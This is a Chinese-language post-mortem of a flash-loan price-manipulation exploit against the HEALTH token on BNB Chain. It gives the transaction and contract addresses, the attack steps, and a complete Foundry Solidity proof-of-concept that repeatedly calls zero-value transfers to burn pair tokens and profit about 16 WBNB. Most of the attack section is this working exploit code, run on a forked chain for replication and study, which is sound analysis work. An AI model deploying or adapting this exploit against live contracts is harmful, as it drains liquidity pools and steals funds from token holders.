[toc]
`攻击者通过操纵价格，获得了16个WBNB的利润。
## 事件基本情况
```
tx: 0xae8ca9dc8258ae32899fe641985739c3fa53ab1f603973ac74b424e165c66ccf
区块链：bsc
发送者: 0xde78112ff006f166e4ccfe1dfe4181c9619d3b5d
受害者: 0x32B166e082993Af6598a89397E82e123ca44e74E
攻击合约: 0x80e5fc0d72e4814cb52c16a18c2f2b87ef1ea2d4
调用函数: 0x293e15df
区块高度: 22337426
漏洞点：不恰当的函数逻辑。
```

## hacker攻击流程

1. 调用闪电贷40个WBNB
2. 在回调函数中
	1. 授权40个WBNB给PancakeSwap: Router v2合约。
	2. 调用PancakeSwap的swapExactTokensForTokensSupportingFeeOnTransferTokens（支持收税的根据精确的token交换尽量多的token方法）用WBNB换取Health代币30个
	3. 循环执行HEALTH代币的transfer方法，发送HEALTH代币给sender
	4. 调用PancakeSwap的swapExactTokensForTokensSupportingFeeOnTransferTokens用HEALTH换取WBNB代币56个。
	5. 还钱40个WBNB给闪电贷，攻击者还有16个WBNB
	6. 将钱发送给sender

因为在每次调用transfer的时候uniswapV2Pair按照总数的1/1000的token进行销毁，攻击者重复调用transfer，造成了价格偏差，然后获利。

  流程图如下
![[Pasted image 20230521104035.png]]
![[Pasted image 20230521104223.png]]

  漏洞方法如图
![[Pasted image 20230521103921.png]]


## 攻击点复刻方式

1. 创建攻击合约
2. 在攻击函数中执行闪电贷，
3. 在回调函数中循环执行transfer发送0个HEAlTH给sender，造成价格倾斜，然后用HEALTH兑换WBNB, 最后发送WBNB给sender

## 攻击模拟结果图
![[Pasted image 20230521120825.png]]

## 事件总结
	 在编写智能合约的时候一定要对业务逻辑进行反复验证，防止出现被闪电贷进行放大攻击。

## 攻击代码
```
// SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.10;

  

import "forge-std/Test.sol";

import "./UniversalInterface.sol";

  

// 定义常量

address constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;

address constant HEALTH = 0x32B166e082993Af6598a89397E82e123ca44e74E;

address constant ROUTER = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

address constant FLOAN = 0x0fe261aeE0d1C4DFdDee4102E82Dd425999065F4;

uint256 constant BlockNumber = 22337425;

  

// 定义调用的接口

interface DPPAdvanced {

    function flashLoan(

        uint256 baseAmount,

        uint256 quoteAmount,

        address assetTo,

        bytes calldata data

    ) external;

}

  

// 攻击合约

contract Exploit is Test{

  

// 设置攻击环境

    function setUp() public {

        vm.createSelectFork("bsc", BlockNumber);

        vm.label(HEALTH, "HEALTH");

        // vm.label(victim, "victim");

    }

  

// 攻击函数

    function testAttack() public {

        IERC20(WBNB).approve(address(ROUTER), type(uint).max);

        IERC20(HEALTH).approve(address(ROUTER), type(uint).max);

        console.log("WBNB owned before attack:", IERC20(WBNB).balanceOf(address(this)));

        // 调用闪电贷 40000000000000000000

        DPPAdvanced(FLOAN).flashLoan(40000000000000000000,0,address(this), "0x61");

        console.log("WBNB owned after attack:", IERC20(WBNB).balanceOf(address(this)));

  

    }

  

// 回调函数

    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) public {

  

        // 查看合约拥有多少WBNB

        uint256 loanWBNB = IERC20(WBNB).balanceOf(address(this));

        console.log("flashloan money :", loanWBNB);

  

        // 将WBNB兑换成HEALTH

        WBNBToHEALTH();

  

        // 循环执行transfer

        for(int i = 0; i < 1000; i++){

            IERC20(HEALTH).transfer(address(this), 0);

        }

  

        // 将HEALTH兑换成WBNB

        HEALTHTOWBNB();

  

        // 归还闪电贷

        IERC20(WBNB).transfer(FLOAN, loanWBNB);

    }

  

    function WBNBToHEALTH() internal {

        address[] memory path = new address[](2);

        path[0] = address(WBNB);

        path[1] = address(HEALTH);

        IPancakeRouter02(ROUTER).swapExactTokensForTokensSupportingFeeOnTransferTokens(

            IERC20(WBNB).balanceOf(address(this)),

            0,

            path,

            address(this),

            block.timestamp

        );

    }

  

    function HEALTHTOWBNB() internal {

        address[] memory path = new address[](2);

        path[0] = address(HEALTH);

        path[1] = address(WBNB);

        IPancakeRouter02(ROUTER).swapExactTokensForTokensSupportingFeeOnTransferTokens(

            IERC20(HEALTH).balanceOf(address(this)),

            0,

            path,

            address(this),

            block.timestamp

        );

    }

}
```
